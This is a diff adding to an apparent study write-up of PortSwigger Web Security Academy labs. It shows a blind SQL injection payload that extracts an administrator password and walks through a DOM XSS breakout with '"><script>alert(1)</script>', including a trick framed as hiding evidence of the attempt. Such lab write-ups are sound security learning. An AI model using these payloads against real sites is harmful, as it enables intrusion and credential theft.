@@ -367,3 +367,61 @@ Now we can brute-force each character of the password by comparing substrings. I
  TrackingId=llAYAzMok8oSbWEr' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users WHERE username='administrator')=1--
 ```
 <img width="1804" height="670" alt="image" src="https://github.com/user-attachments/assets/1dcb82ad-fa2e-4d9a-8b3e-1f62425e4af1" />
+
+## Cross site Scripting (XSS)
+### Lab 03: DOM XSS in document.write sink using source location.search
+
+> This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data
+>  out to the page. The document.write function is called with data from location.search, which you can control using the website URL.
+>
+> Goal: Calls the alert function.
+
+#### Recon
+
+Upon analysing the source code, it contains a function `trackSearch`. This function creates an `<img>` tag dynamically where the source is `/resources/images/tracker.gif` and adds user input (`query`) into parameter `searchTerms`. The value is whatever the user searched for.
+
+```js
+function trackSearch(query) {
+  document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+}
+```
+This code will gets the URL parameter `search` and assign to `query`. For example, `https://0a64009d04f31c158348380a00d60030.web-security-academy.net/?search=test` will have `query=test`
+
+```js
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+  trackSearch(query);
+}
+```
+There is no sanitization for user input into `query` and it will be directly put into `<img>` tag. This is where we can exploit XSS.
+
+#### Exploitation
+To inject JavaScript, we first need to escape from the HTML created by the vulnerable code.
+
+If we input `">`, it breaks the src attribute and closes the `<img>` tag. We successfully escaped the HTML context and can inject our `script` tag next.
+```
+<img src="/resources/images/tracker.gif?searchTerms='">'">
+```
+<img width="1648" height="619" alt="image" src="https://github.com/user-attachments/assets/ea18dfd3-e14b-452b-80b6-507dba7f4b8b" />
+
+Now that we can break the <img> element, we inject a <script> tag right after it.
+```js
+"><script>alert(1)</script>
+```
+The generated HTML becomes:
+```
+<img src="/resources/images/tracker.gif?searchTerms="><script>alert(1)</script>">
+```
+The `<script>` tag executes and alert(1) pops up
+
+<img width="1192" height="307" alt="image" src="https://github.com/user-attachments/assets/95ee9f27-e167-4867-b96e-40737c0d4872" />
+
+After our injected `<script>`, the browser still renders the leftover `">` which is harmless, but visible.
+
+<img width="1192" height="307" alt="image" src="https://github.com/user-attachments/assets/610b9766-1dc6-446e-bbac-3f2ac6478617" />
+
+If we want to remove any evidence of XSS attempt, we can include HTML comment at the end `<!--`. 
+```
+"><script>alert(1)</script><!--
+```
+<img width="1159" height="349" alt="image" src="https://github.com/user-attachments/assets/4382bfea-d274-4a28-a492-ffa2bb5bde1a" />
